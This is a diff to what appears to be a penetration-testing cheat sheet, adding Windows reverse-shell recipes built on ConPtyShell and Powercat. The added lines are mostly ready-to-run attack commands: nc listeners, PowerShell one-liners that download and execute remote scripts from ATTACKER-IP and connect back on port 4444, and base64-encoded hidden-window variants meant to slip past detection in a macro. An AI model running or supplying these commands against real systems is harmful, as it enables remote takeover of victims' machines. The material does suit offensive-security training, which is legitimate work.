@@ -63,6 +63,31 @@ Sub MyMacro()
 End Sub
 ```
 
+Reverse Shell with ConPtyShell
+
+* Found `https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1`
+* **Requires:** Windows 10 / Windows Server 2019 version 1809 (build 10.0.17763)
+* prepare download `cat Invoke-ConPtyShell.ps1; python3 -m http.server 80`
+* prepare listener `stty raw -echo; (stty size; cat) | nc -lvnp 4444`
+
+Attack (server)
+
+```shell
+stty raw -echo; (stty size; cat) | nc -lvnp 4444
+```
+
+Victim (client)
+
+```powershell
+# conptyshell one-liner
+powershell.exe -nop -w hidden -c "IEX (New-Object System.Net.WebClient).DownloadString('http://ATTACKER-IP:8000/Invoke-ConPtyShell.ps1');Invoke-ConPtyShell ATTACKER-IP 4444"
+
+# conptyshell obfuscation
+$Shell= "IEX (New-Object System.Net.WebClient).DownloadString('http://ATTACKER-IP:80/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell ATTACKER-IP 4444"
+$Base64Shell = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Shell))
+powershell.exe -nop -w hidden -e $Base64Shell
+```
+
 Reverse Shell with Powercat
 
 * prepare download `cat powercat.ps1; python3 -m http.server 80`
@@ -72,10 +97,25 @@ Reverse Shell with Powercat
   * encode utf-8 and base64
   * split the base64 string
 
+Attack (server)
+
+```bash
+nc -nlvp 4444
+```
+
+Victim (client)
+
 ```powershell
-$Shell= "IEX (New-Object System.Net.WebClient).DownloadString('http://ATTACKER-IP/powercat.ps1');powercat -c ATTACKER-IP -p 4444 -ep"
+# powercat one liner
+powershell.exe -nop -w hidden -c "IEX (New-Object System.Net.WebClient).DownloadString('http://Attacker-IP:8000/powercat.ps1');powercat -c Attacker-IP -p 4444 -ep"
+
+# powercat obfuscation
+$Shell= "IEX (New-Object System.Net.WebClient).DownloadString('http://ATTACKER-IP:8000/powercat.ps1');powercat -c ATTACKER-IP -p 4444 -ep"
 $Base64Shell = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Shell))
+powershell.exe -nop -w hidden -e $Base64Shell
+
 python3 ./tools/split-vb-pwsh-command.py $Base64Shell
+
 ```
 
 ```python
